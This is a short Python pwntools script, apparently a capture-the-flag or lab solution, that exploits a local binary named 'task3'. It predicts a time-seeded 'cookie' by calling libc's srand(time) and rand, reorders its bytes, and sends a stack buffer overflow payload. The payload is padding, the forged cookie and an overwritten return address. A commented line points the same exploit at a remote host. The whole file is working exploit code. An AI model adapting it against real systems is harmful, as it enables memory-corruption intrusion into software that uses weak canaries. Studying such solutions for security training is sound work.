from ctypes import *
from pwn import *

io = process("./task3")
#io = process(["/bin/nc", "ip", "port"])

libc = cdll.LoadLibrary('libc.so.6')
libc.srand(libc.time(0))
cookie_value = libc.rand()
cookie_str = str(hex(cookie_value))
good_cookie_str = cookie_str[8:10] + cookie_str[6:8] + cookie_str[4:6] + cookie_str[2:4]
cookie_bytes = bytes.fromhex(good_cookie_str)

io.recvline()
io.recvline()
io.recvline()
io.recvline()
io.recvline()
io.recvline()
io.recvline()
io.recvline()
io.recvline()

io.sendline(b'\x41'*8 + b'\x00'*36 + cookie_bytes + b'\x00'*8 + b'\xf6\x11\x40\x00' + b'\x00'*4)

hello = io.recvline()
print(hello)
hello = io.recvline()
print(hello)
hello = io.recvline()
print(hello)

